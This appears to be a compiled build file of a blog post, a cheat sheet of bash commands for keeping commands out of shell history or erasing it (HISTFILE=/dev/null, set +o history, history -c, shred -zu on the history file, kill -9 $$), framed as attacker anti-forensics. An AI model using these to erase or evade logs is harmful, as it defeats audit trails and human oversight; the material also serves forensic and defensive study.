key = sourceSymbolKeys[i]; if (excluded.indexOf(key) >= 0) continue; if (!Object.prototype.propertyIsEnumerable.call(source, key)) continue; target[key] = source[key]; } } return target; }\n\nfunction _objectWithoutPropertiesLoose(source, excluded) { if (source == null) return {}; var target = {}; var sourceKeys = Object.keys(source); var key, i; for (i = 0; i < sourceKeys.length; i++) { key = sourceKeys[i]; if (excluded.indexOf(key) >= 0) continue; target[key] = source[key]; } return target; }\n\n/* @jsx mdx */\nvar _frontmatter = {\n  \"title\": \"Hiding Your Tracks Bash History\",\n  \"author\": \"Bad3r\",\n  \"date\": \"2020-01-20T00:00:00.000Z\",\n  \"hero\": \"./images/Hiding-Your-Tracks-Bash-History.jpg\",\n  \"excerpt\": \"Tricks to hide bash history.\"\n};\n\nvar makeShortcode = function makeShortcode(name) {\n  return function MDXDefaultShortcode(props) {\n    console.warn(\"Component \" + name + \" was not imported, exported, or provided by MDXProvider as global scope\");\n    return mdx(\"div\", props);\n  };\n};\n\nvar layoutProps = {\n  _frontmatter: _frontmatter\n};\nvar MDXLayout = \"wrapper\";\nreturn function MDXContent(_ref) {\n  var components = _ref.components,\n      props = _objectWithoutProperties(_ref, [\"components\"]);\n\n  return mdx(MDXLayout, _extends({}, layoutProps, props, {\n    components: components,\n    mdxType: \"MDXLayout\"\n  }), mdx(\"p\", null, \"Different techniques for preventing commands from being stored in \", mdx(\"inlineCode\", {\n    parentName: \"p\"\n  }, \"$HISTFILE\")), mdx(\"h1\", {\n    \"id\": \"❯-bash-history\"\n  }, \"\\u276F Bash history\"), mdx(\"p\", null, \"Bash maintains the list of commands internally in memory while it\\u2019s running. They are written into \", mdx(\"inlineCode\", {\n    parentName: \"p\"\n  }, \"$HISTFILE\"), \" (i.e, \", mdx(\"inlineCode\", {\n    parentName: \"p\"\n  }, \"~/.bash_history\"), \")  when a user logs off. \"), mdx(\"pre\", null, mdx(\"code\", _extends({\n    parentName: \"pre\"\n  }, {\n    \"className\": \"language-powershell\"\n  }), \"\\u276F echo $HISTFILE           \\n/home/bad3r/.bash_history\\n\")), mdx(\"p\", null, \"This post is a cheat sheet for common methods attackers use to hide commands from being saved in the history file or in memory\"), mdx(\"h2\", {\n    \"id\": \"❯-leading-space\"\n  }, \"\\u276F Leading Space\"), mdx(\"p\", null, \"Might not be enabled by default in some distros \"), mdx(\"p\", null, \"Starting each command with a leading space character\"), mdx(\"pre\", null, mdx(\"code\", _extends({\n    parentName: \"pre\"\n  }, {\n    \"className\": \"language-powershell\"\n  }), \"\\u276F echo \\\"hello\\\"\\nhello\\n\\u276F  echo \\\"ritsec\\\"\\nritsec\\n\\u276F history \\n    1  ls\\n    2  echo \\\"hello\\\"\\n    3  history \\n\")), mdx(\"p\", null, \"Notice that the command \", mdx(\"inlineCode\", {\n    parentName: \"p\"\n  }, \"$echo \\\"hello\\\"\"), \" was saved  history unlike the commas with a leading space \", mdx(\"inlineCode\", {\n    parentName: \"p\"\n  }, \"$ echo \\\"ritsec\\\"\"), \". This is possible because of \", mdx(\"inlineCode\", {\n    parentName: \"p\"\n  }, \"HISTCONTROL\"), \" environment variable \"), mdx(\"pre\", null, mdx(\"code\", _extends({\n    parentName: \"pre\"\n  }, {\n    \"className\": \"language-powershell\"\n  }), \"\\u276F head -2 /etc/os-release\\n NAME=\\\"Ubuntu\\\" \\n VERSION=\\\"18.04.3 LTS (Bionic Beaver)\\\" \\n\\u276F echo $HISTCONTROL\\n ignoredups:ignorespace\\n\")), mdx(\"h2\", {\n    \"id\": \"❯-histfile\"\n  }, \"\\u276F \", mdx(\"inlineCode\", {\n    parentName: \"h2\"\n  }, \"HISTFILE\")), mdx(\"p\", null, \"The \", mdx(\"inlineCode\", {\n    parentName: \"p\"\n  }, \"HISTFILE\"), \" environment variable specifies bash history file\"), mdx(\"pre\", null, mdx(\"code\", _extends({\n    parentName: \"pre\"\n  }, {\n    \"className\": \"language-powershell\"\n  }), \"\\u276F man bash\\nHISTFILE\\n  The  name  of the file in which command history is saved (see HISTORY be\\u2010\\n  low).  The default value is ~/.bash_history.  If unset, the command  his\\u2010\\n  tory is not saved when a shell exits.\\n  the  value of HISTIGNORE.  The pattern matching honors the setting of the\\n  extglob shell option.\\n\")), mdx(\"pre\", null, mdx(\"code\", _extends({\n    parentName: \"pre\"\n  }, {\n    \"className\": \"language-powershell\"\n  }), \"\\u276F echo $HISTFILE\\n/home/bad3r/.bash_history\\n\")), mdx(\"p\", null, \"To avoid recording commands to the file in \", mdx(\"inlineCode\", {\n    parentName: \"p\"\n  }, \"$HISTFILE\"), \" set \", mdx(\"inlineCode\", {\n    parentName: \"p\"\n  }, \"HISTFILE\"), \" value to \", mdx(\"inlineCode\", {\n    parentName: \"p\"\n  }, \"/dev/null\"), \" \"), mdx(\"pre\", null, mdx(\"code\", _extends({\n    parentName: \"pre\"\n  }, {\n    \"className\": \"language-powershell\"\n  }), \"\\u276F HISTFILE=/dev/null\\nOR\\n\\u276F export HISTFILE=/dev/null\\n\")), mdx(\"h3\", {\n    \"id\": \"❯-using-unset\"\n  }, \"\\u276F Using unset\"), mdx(\"pre\", null, mdx(\"code\", _extends({\n    parentName: \"pre\"\n  }, {\n    \"className\": \"language-powershell\"\n  }), \"man bash\\nunset\\n  Remove variable or function names\\n\")), mdx(\"p\", null, \"We can use \", mdx(\"inlineCode\", {\n    parentName: \"p\"\n  }, \"unset\"), \" to remove the variable \", mdx(\"inlineCode\", {\n    parentName: \"p\"\n  }, \"HISTFILE\"), \" for the current session \"), mdx(\"pre\", null, mdx(\"code\", _extends({\n    parentName: \"pre\"\n  }, {\n    \"className\": \"language-powershell\"\n  }), \"\\u276F echo $HISTFILE\\n/root/.bash_history\\n\\u276F unset HISTFILE\\n\\u276F echo $HISTFILE\\n\\n\\u276F\\n\")), mdx(\"p\", null, \"Note that it will only effect the current session. If you start another session the variable \", mdx(\"inlineCode\", {\n    parentName: \"p\"\n  }, \"HISTFILE\"), \" will still be set unlike changing \", mdx(\"inlineCode\", {\n    parentName: \"p\"\n  }, \"$HISTILE\"), \" value to \", mdx(\"inlineCode\", {\n    parentName: \"p\"\n  }, \"/dev/null\")), mdx(\"h2\", {\n    \"id\": \"❯-histsize--histfilesize\"\n  }, \"\\u276F \", mdx(\"inlineCode\", {\n    parentName: \"h2\"\n  }, \"HISTSIZE\"), \" & \", mdx(\"inlineCode\", {\n    parentName: \"h2\"\n  }, \"HISTFILESIZE\")), mdx(\"p\", null, \"Notice the distinction between \", mdx(\"inlineCode\", {\n    parentName: \"p\"\n  }, \"file\"), \": on disk - and \", mdx(\"inlineCode\", {\n    parentName: \"p\"\n  }, \"list\"), \": in memory.\"), mdx(\"p\", null, mdx(\"inlineCode\", {\n    parentName: \"p\"\n  }, \"HISTSIZE\"), \" is the number of lines or commands that are stored in memory in a history list while your bash session is ongoing.\"), mdx(\"pre\", null, mdx(\"code\", _extends({\n    parentName: \"pre\"\n  }, {\n    \"className\": \"language-powershell\"\n  }), \"\\u276F man bash\\n\\nHISTSIZE\\n  The number of commands to remember in the command  history  (see  HISTORY\\n  below).   If  the value is 0, commands are not saved in the history list.\\n  Numeric values less than zero result in every command being saved on  the\\n  history  list  (there  is no limit).  The shell sets the default value to\\n  500 after reading any startup files.\\n\")), mdx(\"p\", null, \"In order to remove all commands from to the history list in memory change the size to 0\"), mdx(\"pre\", null, mdx(\"code\", _extends({\n    parentName: \"pre\"\n  }, {\n    \"className\": \"language-powershell\"\n  }), \"\\u276F echo $HISTSIZE\\n1000\\n\\u276F HISTSIZE=0  # OR export HISTSIZE=0\\n\\u276F echo $HISTSIZE\\n0\\n\")), mdx(\"p\", null, mdx(\"inlineCode\", {\n    parentName: \"p\"\n  }, \"HISTFILESIZE\"), \" is the number of lines or commands that \"), mdx(\"ul\", null, mdx(\"li\", {\n    parentName: \"ul\"\n  }, \"are allowed in the history file at startup time of a session, and\"), mdx(\"li\", {\n    parentName: \"ul\"\n  }, \"are stored in the history file at the end of your bash session for use in future sessions.\")), mdx(\"pre\", null, mdx(\"code\", _extends({\n    parentName: \"pre\"\n  }, {\n    \"className\": \"language-powershell\"\n  }), \"\\u276F man bash\\n\\nHISTFILESIZE\\n  The  maximum  number  of  lines contained in the history file.  When this\\n  variable is assigned a value, the history file is  truncated,  if  neces\\u2010\\n  sary, to contain no more than that number of lines by removing the oldest\\n  entries.  The history file is also truncated to this size  after  writing\\n  it  when a shell exits.  If the value is 0, the history file is truncated\\n  to zero size.  Non-numeric values and numeric values less than  zero  in\\u2010\\n  hibit truncation.  The shell sets the default value to the value of HIST\\u2010\\n  SIZE after reading any startup files.\\n\")), mdx(\"pre\", null, mdx(\"code\", _extends({\n    parentName: \"pre\"\n  }, {\n    \"className\": \"language-powershell\"\n  }), \"\\u276F echo $HISTFILESIZE\\n2000\\n\\u276F HISTFILESIZE=0  # OR export HISTFILESIZE=0\\n\")), mdx(\"h2\", {\n    \"id\": \"❯-the-set--shopt-builtin\"\n  }, \"\\u276F The Set & Shopt Builtin\"), mdx(\"p\", null, \"The \", mdx(\"inlineCode\", {\n    parentName: \"p\"\n  }, \"set\"), \" builtin allows you to change the values of shell options and set the positional parameters, or to display the names and values of shell variables.\\nUsing \", mdx(\"inlineCode\", {\n    parentName: \"p\"\n  }, \"set\"), \" we can avoid recording new commands to the history list in memory. And,  because it\\u2019s not being saved in memory, it can not be recorded to file\"), mdx(\"ul\", null, mdx(\"li\", {\n    parentName: \"ul\"\n  }, mdx(\"inlineCode\", {\n    parentName: \"li\"\n  }, \"-o\"), \" option-name:    Set the option corresponding to option-name \")), mdx(\"p\", null, \"The option name here is \", mdx(\"inlineCode\", {\n    parentName: \"p\"\n  }, \"history\"), \" and its enabled by default. Using \\u2018+\\u2019 rather than \\u2018-\\u2019 causes these options to be turned off\"), mdx(\"pre\", null, mdx(\"code\", _extends({\n    parentName: \"pre\"\n  }, {\n    \"className\": \"language-powershell\"\n  }), \"\\u276F set +o history\\n\")), mdx(\"p\", null, \"Using \\u2018-\\u2019 we can enable it again;\"), mdx(\"pre\", null, mdx(\"code\", _extends({\n    parentName: \"pre\"\n  }, {\n    \"className\": \"language-powershell\"\n  }), \"\\u276F set -o history\\n\")), mdx(\"p\", null, \"Alternatively the \", mdx(\"inlineCode\", {\n    parentName: \"p\"\n  }, \"shopt\"), \" builtin command can be used\\nshopt builtin command allows you to change additional shell optional behavior.\"), mdx(\"ul\", null, mdx(\"li\", {\n    parentName: \"ul\"\n  }, mdx(\"inlineCode\", {\n    parentName: \"li\"\n  }, \"-u\"), \"    Disable (unset) each optname.\\n\", mdx(\"inlineCode\", {\n    parentName: \"li\"\n  }, \" \"), \"-o`    Restricts the values of optname to be those defined for the -o option to the set builtin\")), mdx(\"pre\", null, mdx(\"code\", _extends({\n    parentName: \"pre\"\n  }, {\n    \"className\": \"language-powershell\"\n  }), \"\\u276F shopt -ou history\\n\")), mdx(\"p\", null, \"Re-enable it using the \", mdx(\"inlineCode\", {\n    parentName: \"p\"\n  }, \"-s\"), \" flag; \"), mdx(\"ul\", null, mdx(\"li\", {\n    parentName: \"ul\"\n  }, mdx(\"inlineCode\", {\n    parentName: \"li\"\n  }, \"-s\"), \"    Enable (set) each optname.\")), mdx(\"pre\", null, mdx(\"code\", _extends({\n    parentName: \"pre\"\n  }, {\n    \"className\": \"language-powershell\"\n  }), \"\\u276F shopt -os history\\n\")), mdx(\"h2\", {\n    \"id\": \"❯-clearing-the-history\"\n  }, \"\\u276F Clearing the History\"), mdx(\"p\", null, \"Rather than disabling command history, we can clear the history on the current bash shell by simply using the \", mdx(\"inlineCode\", {\n    parentName: \"p\"\n  }, \"history\"), \" command with the \", mdx(\"inlineCode\", {\n    parentName: \"p\"\n  }, \"-c\"), \" (clear) flag\"), mdx(\"pre\", null, mdx(\"code\", _extends({\n    parentName: \"pre\"\n  }, {\n    \"className\": \"language-powershell\"\n  }), \"\\u276F history -c\\n\")), mdx(\"p\", null, \"Then, to make certain the changes are written to disk, we need to tell the history command to write to disk with the \", mdx(\"inlineCode\", {\n    parentName: \"p\"\n  }, \"-w\"), \" flag\"), mdx(\"pre\", null, mdx(\"code\", _extends({\n    parentName: \"pre\"\n  }, {\n    \"className\": \"language-powershell\"\n  }), \"\\u276F history -w\\n\")), mdx(\"p\", null, \"This only clears the history of the current shell. Commands run in other shells will remain on disk.\"), mdx(\"h2\", {\n    \"id\": \"❯-shredding-the-history\"\n  }, \"\\u276F Shredding the History\"), mdx(\"pre\", null, mdx(\"code\", _extends({\n    parentName: \"pre\"\n  }, {\n    \"className\": \"language-powershell\"\n  }), \"\\u276F man shred\\n  shred - overwrite a file to hide its contents, and optionally delete it\\n\")), mdx(\"p\", null, \"The \", mdx(\"inlineCode\", {\n    parentName: \"p\"\n  }, \"shred\"), \" command shreds the target file making it unreadable\"), mdx(\"pre\", null, mdx(\"code\", _extends({\n    parentName: \"pre\"\n  }, {\n    \"className\": \"language-powershell\"\n  }), \"\\u276F cat $HISTFILE\\nls\\nhistory -w\\n\\u276F shred $HISTFILE\\n\\u276F cat $HISTFILE\\n ,I\\xE7!h\\xF92g2V?\\u01A5f[\\xC6{L\\xB4w\\u0658\\xCC\\u02FFvC\\xD3/Zs\\nP\\xECP\\xF5\\xE4{K{\\xEB\\xFAJ :i6\\xAD\\xDA\\xFBR\\u0708?\\xC4\\xF1W?\\xE4\\xC6n6\\xBB\\xAC\\xCBo\\xFBD;NG\\xD6\\xCB\\xD3\\xE2\\xAFTR\\x7F\\xFA&\\xCD__t\\xC7\\xD9\\n?\\xCFG5\\xC3\\xF6-\\xF2y\\xDE\\xC8\\n           O\\xCB\\xE3\\n...\\n\")), mdx(\"p\", null, \"After using the \", mdx(\"inlineCode\", {\n    parentName: \"p\"\n  }, \"shred\"), \" command the history file contains bunch of binary data that is nonsense.\"), mdx(\"p\", null, \"The fact that the file is shredded may in itself be considered evidence of malicious activity. We can eliminate even that by combining the \", mdx(\"inlineCode\", {\n    parentName: \"p\"\n  }, \"shred\"), \" command with the \", mdx(\"inlineCode\", {\n    parentName: \"p\"\n  }, \"-zu\"), \" flags\"), mdx(\"ul\", null, mdx(\"li\", {\n    parentName: \"ul\"\n  }, mdx(\"inlineCode\", {\n    parentName: \"li\"\n  }, \"-u\"), \" deallocate and remove file after overwriting\"), mdx(\"li\", {\n    parentName: \"ul\"\n  }, mdx(\"inlineCode\", {\n    parentName: \"li\"\n  }, \"-z\"), \" a final overwrite with zeros to hide shredding\")), mdx(\"pre\", null, mdx(\"code\", _extends({\n    parentName: \"pre\"\n  }, {\n    \"className\": \"language-powershell\"\n  }), \"\\u276F cat $HISTFILE\\nls\\nhistory -w\\u276F docker exec -ti 6e0aec73e61c bash\\n\\n\\u276F shred -zu $HISTFILE\\n\\u276F cat $HISTFILE\\ncat: /root/.bash_history: No such file or directory\\n\")), mdx(\"h2\", {\n    \"id\": \"❯-killing-bash-process\"\n  }, \"\\u276F Killing Bash Process\"), mdx(\"p\", null, \"Using the \", mdx(\"inlineCode\", {\n    parentName: \"p\"\n  }, \"kill\"), \" command we can exit the session without saving commands in memory to disk using;\"), mdx(\"pre\", null, mdx(\"code\", _extends({\n    parentName: \"pre\"\n  }, {\n    \"className\": \"language-powershell\"\n  }), \"\\u276F kill -9 $$\\n\")), mdx(\"p\", null, \"thanks to \", mdx(\"a\", _extends({\n    parentName: \"p\"\n  }, {\n    \"href\": \"https://twitter.com/ReigningShells\",\n    \"target\": \"_blank\",\n    \"rel\": \"noreferrer\"\n  }), \"@ReigningShells\")), mdx(\"h2\", {\n    \"id\": \"❯-using-more\"\n  }, \"\\u276F Using More\"), mdx(\"p\", null, \"We can hide a command from being saved in memory using \", mdx(\"inlineCode\", {\n    parentName: \"p\"\n  }, \"more\"), \" ability to excute commands by prepending them with \", mdx(\"inlineCode\", {\n    parentName: \"p\"\n  }, \"!\"), \" \"), mdx(\"ul\", null, mdx(\"li\", {\n    parentName: \"ul\"\n  }, mdx(\"inlineCode\", {\n    parentName: \"li\"\n  }, \"!<cmd>\"), \" or \", mdx(\"inlineCode\", {\n    parentName: \"li\"\n  }, \":!<cmd>\"), \" Execute \", mdx(\"inlineCode\", {\n    parentName: \"li\"\n  }, \"<cmd>\"), \" in a subshell\")), mdx(\"pre\", null, mdx(\"code\", _extends({\n    parentName: \"pre\"\n  }, {\n    \"className\": \"language-powershell\"\n  }), \"\\u276F ps -aef | more                        \\nUID          PID    PPID  C STIME TTY          TIME CMD\\nroot           1       0  0 Jan20 ?        00:00:03 /sbin/init\\nroot           2       0  0 Jan20 ?        00:00:00 [kthreadd]\\nroot           3       2  0 Jan20 ?        00:00:00 [rcu_gp]\\n...\\n!echo \\\"thanks @13_0_0_0_0\\\"\\nthanks @13_0_0_0_0\\n------------------------\\n\")), mdx(\"p\", null, \"At the more prompt type \", mdx(\"inlineCode\", {\n    parentName: \"p\"\n  }, \"!\"), \" or \", mdx(\"inlineCode\", {\n    parentName: \"p\"\n  }, \":!\"), \" followed by your command.\"), mdx(\"p\", null, \"This same technique can be used with other \", mdx(\"a\", _extends({\n    parentName: \"p\"\n  }, {\n    \"href\": \"https://gtfobins.github.io/\",\n    \"target\": \"_blank\",\n    \"rel\": \"noreferrer\"\n  }), \"GTFOBIN\"), \" like \", mdx(\"inlineCode\", {\n    parentName: \"p\"\n  }, \"vim\"), \" \"));\n}\n;\nMDXContent.isMDXComponent = true;","hero":{"full":{"base64":"data:image/jpeg;base64,/9j/2wBDABALDA4MChAODQ4SERATGCgaGBYWGDEjJR0oOjM9PDkzODdASFxOQERXRTc4UG1RV19iZ2hnPk1xeXBkeFxlZ2P/2wBDARESEhgVGC8aGi9jQjhCY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2P/wgARCAANABQDASIAAhEBAxEB/8QAFwAAAwEAAAAAAAAAAAAAAAAAAAIEAf/EABYBAQEBAAAAAAAAAAAAAAAAAAMBAv/aAAwDAQACEAMQAAABtWdyVDC4/8QAGhAAAgMBAQAAAAAAAAAAAAAAAAECAxESIv/aAAgBAQABBQKNuKVnS8ikaaf/xAAYEQADAQEAAAAAAAAAAAAAAAAAAhETFP/aAAgBAwEBPwHJZDnQ/8QAFxEAAwEAAAAAAAAAAAAAAAAAAAETAv/aAAgBAgEBPwGjK6P/xAAZEAABBQAAAAAAAAAAAAAAAAAAASAhMTL/2gAIAQEABj8CyShTP//EABsQAQEAAgMBAAAAAAAAAAAAAAEAESFBcYGh/9oACAEBAAE/IdSfc6A47h5t8kCXidr/2gAMAwEAAgADAAAAEKQv/8QAGBEAAwEBAAAAAAAAAAAAAAAAAAEhEUH/2gAIAQMBAT8QVRQx4f/EABcRAAMBAAAAAAAAAAAAAAAAAAARIWH/2gAIAQIBAT8Qq2bn/8QAHRABAAICAgMAAAAAAAAAAAAAAQARITFBkVFh0f/aAAgBAQABPxBR0TASEVbNadkIZTy/DNIg7KN+o/A6n//Z","aspectRatio":1.5031847133757963,"src":"/static/c039ecc8b1902ba211f89fb93fee93f6/58fe7/Hiding-Your-Tracks-Bash-History.jpg","srcSet":"/static/c039ecc8b1902ba211f89fb93fee93f6/e0f30/Hiding-Your-Tracks-Bash-History.jpg 236w,\n/static/c039ecc8b1902ba211f89fb93fee93f6/86afd/Hiding-Your-Tracks-Bash-History.jpg 472w,\n/static/c039ecc8b1902ba211f89fb93fee93f6/58fe7/Hiding-Your-Tracks-Bash-History.jpg 944w,\n/static/c039ecc8b1902ba211f89fb93fee93f6/02748/Hiding-Your-Tracks-Bash-History.jpg 1416w,\n/static/c039ecc8b1902ba211f89fb93fee93f6/5c241/Hiding-Your-Tracks-Bash-History.jpg 1888w,\n/static/c039ecc8b1902ba211f89fb93fee93f6/5dbbf/Hiding-Your-Tracks-Bash-History.jpg 2048w","srcWebp":"/static/c039ecc8b1902ba211f89fb93fee93f6/99fbb/Hiding-Your-Tracks-Bash-History.webp","srcSetWebp":"/static/c039ecc8b1902ba211f89fb93fee93f6/77392/Hiding-Your-Tracks-Bash-History.webp 236w,\n/static/c039ecc8b1902ba211f89fb93fee93f6/1f177/Hiding-Your-Tracks-Bash-History.webp 472w,\n/static/c039ecc8b1902ba211f89fb93fee93f6/99fbb/Hiding-Your-Tracks-Bash-History.webp 944w,\n/static/c039ecc8b1902ba211f89fb93fee93f6/4a492/Hiding-Your-Tracks-Bash-History.webp 1416w,\n/static/c039ecc8b1902ba211f89fb93fee93f6/b0b8f/Hiding-Your-Tracks-Bash-History.webp 1888w,\n/static/c039ecc8b1902ba211f89fb93fee93f6/ceab5/Hiding-Your-Tracks-Bash-History.webp 2048w","sizes":"(max-width: 944px) 100vw, 944px"},"regular":{"base64":"data:image/jpeg;base64,/9j/2wBDABALDA4MChAODQ4SERATGCgaGBYWGDEjJR0oOjM9PDkzODdASFxOQERXRTc4UG1RV19iZ2hnPk1xeXBkeFxlZ2P/2wBDARESEhgVGC8aGi9jQjhCY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2P/wgARCAANABQDASIAAhEBAxEB/8QAFwAAAwEAAAAAAAAAAAAAAAAAAAIEAf/EABYBAQEBAAAAAAAAAAAAAAAAAAMBAv/aAAwDAQACEAMQAAABtWdyVDC4/8QAGhAAAgMBAQAAAAAAAAAAAAAAAAECAxESIv/aAAgBAQABBQKNuKVnS8ikaaf/xAAYEQADAQEAAAAAAAAAAAAAAAAAAhETFP/aAAgBAwEBPwHJZDnQ/8QAFxEAAwEAAAAAAAAAAAAAAAAAAAETAv/aAAgBAgEBPwGjK6P/xAAZEAABBQAAAAAAAAAAAAAAAAAAASAhMTL/2gAIAQEABj8CyShTP//EABsQAQEAAgMBAAAAAAAAAAAAAAEAESFBcYGh/9oACAEBAAE/IdSfc6A47h5t8kCXidr/2gAMAwEAAgADAAAAEKQv/8QAGBEAAwEBAAAAAAAAAAAAAAAAAAEhEUH/2gAIAQMBAT8QVRQx4f/EABcRAAMBAAAAAAAAAAAAAAAAAAARIWH/2gAIAQIBAT8Qq2bn/8QAHRABAAICAgMAAAAAAAAAAAAAAQARITFBkVFh0f/aAAgBAQABPxBR0TASEVbNadkIZTy/DNIg7KN+o/A6n//Z","aspectRatio":1.4954128440366972,"src":"/static/c039ecc8b1902ba211f89fb93fee93f6/1dc0b/Hiding-Your-Tracks-Bash-History.jpg","srcSet":"/static/c039ecc8b1902ba211f89fb93fee93f6/3a5ce/Hiding-Your-Tracks-Bash-History.jpg 163w,\n/static/c039ecc8b1902ba211f89fb93fee93f6/05730/Hiding-Your-Tracks-Bash-History.jpg 327w,\n/static/c039ecc8b1902ba211f89fb93fee93f6/1dc0b/Hiding-Your-Tracks-Bash-History.jpg 653w,\n/static/c039ecc8b1902ba211f89fb93fee93f6/f72c7/Hiding-Your-Tracks-Bash-History.jpg 980w,\n/static/c039ecc8b1902ba211f89fb93fee93f6/6e4a3/Hiding-Your-Tracks-Bash-History.jpg 1306w,\n/static/c039ecc8b1902ba211f89fb93fee93f6/5dbbf/Hiding-Your-Tracks-Bash-History.jpg 2048w","srcWebp":"/static/c039ecc8b1902ba211f89fb93fee93f6/0acdf/Hiding-Your-Tracks-Bash-History.webp","srcSetWebp":"/static/c039ecc8b1902ba211f89fb93fee93f6/ac59e/Hiding-Your-Tracks-Bash-History.webp 163w,\n/static/c039ecc8b1902ba211f89fb93fee93f6/7660b/Hiding-Your-Tracks-Bash-History.webp 327w,\n/static/c039ecc8b1902ba211f89fb93fee93f6/0acdf/Hiding-Your-Tracks-Bash-History.webp 653w,\n/static/c039ecc8b1902ba211f89fb93fee93f6/75470/Hiding-Your-Tracks-Bash-History.webp 980w,\n/static/c039ecc8b1902ba211f89fb93fee93f6/68d47/Hiding-Your-Tracks-Bash-History.webp 1306w,\n/static/c039ecc8b1902ba211f89fb93fee93f6/ceab5/Hiding-Your-Tracks-Bash-History.webp 2048w","sizes":"(max-width: 653px) 100vw, 653px"},"narrow":{"base64":"data:image/jpeg;base64,/9j/2wBDABALDA4MChAODQ4SERATGCgaGBYWGDEjJR0oOjM9PDkzODdASFxOQERXRTc4UG1RV19iZ2hnPk1xeXBkeFxlZ2P/2wBDARESEhgVGC8aGi9jQjhCY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2P/wgARCAANABQDASIAAhEBAxEB/8QAFwAAAwEAAAAAAAAAAAAAAAAAAAIEAf/EABYBAQEBAAAAAAAAAAAAAAAAAAMBAv/aAAwDAQACEAMQAAABtWdyVDC4/8QAGhAAAgMBAQAAAAAAAAAAAAAAAAECAxESIv/aAAgBAQABBQKNuKVnS8ikaaf/xAAYEQADAQEAAAAAAAAAAAAAAAAAAhETFP/aAAgBAwEBPwHJZDnQ/8QAFxEAAwEAAAAAAAAAAAAAAAAAAAETAv/aAAgBAgEBPwGjK6P/xAAZEAABBQAAAAAAAAAAAAAAAAAAASAhMTL/2gAIAQEABj8CyShTP//EABsQAQEAAgMBAAAAAAAAAAAAAAEAESFBcYGh/9oACAEBAAE/IdSfc6A47h5t8kCXidr/2gAMAwEAAgADAAAAEKQv/8QAGBEAAwEBAAAAAAAAAAAAAAAAAAEhEUH/2gAIAQMBAT8QVRQx4f/EABcRAAMBAAAAAAAAAAAAAAAAAAARIWH/2gAIAQIBAT8Qq2bn/8QAHRABAAICAgMAAAAAAAAAAAAAAQARITFBkVFh0f/aAAgBAQABPxBR0TASEVbNadkIZTy/DNIg7KN+o/A6n//Z","aspectRatio":1.5,"src":"/static/c039ecc8b1902ba211f89fb93fee93f6/eaa58/Hiding-Your-Tracks-Bash-History.jpg","srcSet":"/static/c039ecc8b1902ba211f89fb93fee93f6/5a3ee/Hiding-Your-Tracks-Bash-History.jpg 114w,\n/static/c039ecc8b1902ba211f89fb93fee93f6/41f8f/Hiding-Your-Tracks-Bash-History.jpg 229w,\n/static/c039ecc8b1902ba211f89fb93fee93f6/eaa58/Hiding-Your-Tracks-Bash-History.jpg 457w,\n/static/c039ecc8b1902ba211f89fb93fee93f6/c309b/Hiding-Your-Tracks-Bash-History.jpg 686w,\n/static/c039ecc8b1902ba211f89fb93fee93f6/e3008/Hiding-Your-Tracks-Bash-History.jpg 914w,\n/static/c039ecc8b1902ba211f89fb93fee93f6/5dbbf/Hiding-Your-Tracks-Bash-History.jpg 2048w","srcWebp":"/static/c039ecc8b1902ba211f89fb93fee93f6/15384/Hiding-Your-Tracks-Bash-History.webp","srcSetWebp":"/static/c039ecc8b1902ba211f89fb93fee93f6/31fce/Hiding-Your-Tracks-Bash-History.webp 114w,\n/static/c039ecc8b1902ba211f89fb93fee93f6/e3e25/Hiding-Your-Tracks-Bash-History.webp 229w,\n/static/c039ecc8b1902ba211f89fb93fee93f6/15384/Hiding-Your-Tracks-Bash-History.webp 457w,\n/static/c039ecc8b1902ba211f89fb93fee93f6/0258d/Hiding-Your-Tracks-Bash-History.webp 686w,\n/static/c039ecc8b1902ba211f89fb93fee93f6/64ea2/Hiding-Your-Tracks-Bash-History.webp 914w,\n/static/c039ecc8b1902ba211f89fb93fee93f6/ceab5/Hiding-Your-Tracks-Bash-History.webp 2048w","sizes":"(max-width: 457px) 100vw, 457px"},"seo":{"src":"/static/c039ecc8b1902ba211f89fb93fee93f6/0ff54/Hiding-Your-Tracks-Bash-History.jpg"}}}]}}}